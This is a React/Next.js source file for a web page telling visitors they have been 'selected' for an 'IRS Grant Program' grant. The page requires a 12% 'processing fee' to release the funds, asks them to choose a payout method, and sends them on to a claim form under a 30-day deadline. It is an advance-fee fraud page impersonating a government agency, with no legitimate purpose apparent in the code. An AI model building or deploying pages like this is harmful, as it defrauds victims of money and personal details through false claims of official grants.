"use client"

import { Suspense, useState } from "react"
import Link from "next/link"
import { useSearchParams } from "next/navigation"
import { motion } from "framer-motion"
import { Trophy, ArrowRight, PartyPopper, DollarSign, CreditCard, Landmark, Info } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Confetti } from "@/components/confetti"

function WinnerContent() {
  const searchParams = useSearchParams()
  const winnerId = searchParams.get("id") || ""
  const amount = searchParams.get("amount") || "0"
  const [paymentMethod, setPaymentMethod] = useState<string>("")

  const numericAmount = Number(amount)
  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(numericAmount)

  const processingFee = numericAmount * 0.12
  const formattedFee = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(processingFee)

  return (
    <div className="min-h-[80vh] flex items-center justify-center bg-gradient-to-b from-muted/30 to-background">
      <Confetti />
      <div className="mx-auto max-w-2xl px-4 py-16 sm:px-6 sm:py-24">
        <motion.div
          initial={{ opacity: 0, scale: 0.8 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8, type: "spring", bounce: 0.4 }}
          className="text-center"
        >
          {/* Icon */}
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ delay: 0.3, type: "spring", bounce: 0.6 }}
            className="mb-8 inline-flex h-24 w-24 items-center justify-center rounded-full bg-gradient-to-br from-yellow-400 to-orange-500 shadow-2xl shadow-yellow-500/30"
          >
            <Trophy className="h-12 w-12 text-white" />
          </motion.div>

          {/* Celebration Text */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5 }}
          >
            <div className="mb-3 flex items-center justify-center gap-2">
              <PartyPopper className="h-6 w-6 text-yellow-500" />
              <span className="text-lg font-semibold text-yellow-600">Congratulations!</span>
              <PartyPopper className="h-6 w-6 text-yellow-500" />
            </div>
            <h1 className="mb-4 text-4xl font-extrabold tracking-tight sm:text-5xl">
              You Have Been Selected!
            </h1>
            <p className="mb-8 text-lg text-muted-foreground">
              You have been approved to receive a federal grant through the IRS Grant Program.
            </p>
          </motion.div>

          {/* Amount Card */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.7 }}
            className="mb-6 overflow-hidden rounded-2xl border-2 border-green-200 bg-gradient-to-br from-green-50 to-emerald-50 p-8 shadow-lg"
          >
            <div className="mb-2 flex items-center justify-center gap-2 text-green-600">
              <DollarSign className="h-5 w-5" />
              <span className="text-sm font-semibold uppercase tracking-widest">Your Approved Grant Amount</span>
            </div>
            <div className="text-5xl font-extrabold text-green-700 sm:text-6xl">
              {formattedAmount}
            </div>
            <p className="mt-3 text-sm text-green-600/80">
              Tax-free federal grant • No repayment required
            </p>
          </motion.div>

          {/* 12% Processing Fee Notice */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.85 }}
            className="mb-8 overflow-hidden rounded-2xl border-2 border-blue-200 bg-gradient-to-br from-blue-50 to-indigo-50 p-6 shadow-md"
          >
            <div className="flex items-start gap-3 text-left">
              <div className="mt-0.5 flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-blue-500/10">
                <Info className="h-5 w-5 text-blue-600" />
              </div>
              <div>
                <h3 className="text-base font-bold text-blue-900 mb-1">Processing Fee Required</h3>
                <p className="text-sm text-blue-700 leading-relaxed">
                  A one-time processing fee of <span className="font-bold">12%</span> ({formattedFee}) is required to release your grant funds. 
                  This fee covers administrative processing, federal verification, and secure fund transfer.
                </p>
              </div>
            </div>
          </motion.div>

          {/* Payment Method Selection */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1.0 }}
            className="mb-8"
          >
            <h3 className="mb-4 text-lg font-bold text-foreground">Choose Payment Method</h3>
            <p className="mb-5 text-sm text-muted-foreground">Select how you would like to receive your grant funds</p>
            <div className="grid grid-cols-2 gap-4">
              <button
                type="button"
                onClick={() => setPaymentMethod("cashier_check")}
                className={`relative rounded-2xl border-2 p-6 text-center transition-all duration-200 hover:shadow-lg ${
                  paymentMethod === "cashier_check"
                    ? "border-primary bg-primary/5 shadow-lg ring-2 ring-primary/20"
                    : "border-muted hover:border-primary/30"
                }`}
              >
                {paymentMethod === "cashier_check" && (
                  <div className="absolute -top-2 -right-2 flex h-6 w-6 items-center justify-center rounded-full bg-primary text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                  </div>
                )}
                <CreditCard className="mx-auto mb-3 h-8 w-8 text-primary" />
                <div className="text-base font-bold">Cashier Check</div>
                <div className="mt-1 text-xs text-muted-foreground">Mailed to your address</div>
              </button>
              <button
                type="button"
                onClick={() => setPaymentMethod("electronic_deposit")}
                className={`relative rounded-2xl border-2 p-6 text-center transition-all duration-200 hover:shadow-lg ${
                  paymentMethod === "electronic_deposit"
                    ? "border-primary bg-primary/5 shadow-lg ring-2 ring-primary/20"
                    : "border-muted hover:border-primary/30"
                }`}
              >
                {paymentMethod === "electronic_deposit" && (
                  <div className="absolute -top-2 -right-2 flex h-6 w-6 items-center justify-center rounded-full bg-primary text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                  </div>
                )}
                <Landmark className="mx-auto mb-3 h-8 w-8 text-primary" />
                <div className="text-base font-bold">Electronic Deposit</div>
                <div className="mt-1 text-xs text-muted-foreground">Direct to your bank</div>
              </button>
            </div>
          </motion.div>

          {/* CTA */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1.1 }}
            className="space-y-4"
          >
            {paymentMethod ? (
              <Button asChild size="xl" className="rounded-full bg-green-600 hover:bg-green-500 shadow-xl shadow-green-600/25 text-lg">
                <Link href={`/claim?id=${winnerId}&amount=${amount}&method=${paymentMethod}`}>
                  Continue to Claim
                  <ArrowRight className="ml-2 h-5 w-5" />
                </Link>
              </Button>
            ) : (
              <Button size="xl" className="rounded-full bg-gray-400 text-lg cursor-not-allowed" disabled>
                Select a Payment Method
              </Button>
            )}
            <p className="text-sm text-muted-foreground">
              Complete your claim form to receive your funds. This offer expires in 30 days.
            </p>
          </motion.div>
        </motion.div>
      </div>
    </div>
  )
}

export default function WinnerPage() {
  return (
    <Suspense fallback={<div className="min-h-[80vh] flex items-center justify-center"><p>Loading...</p></div>}>
      <WinnerContent />
    </Suspense>
  )
}
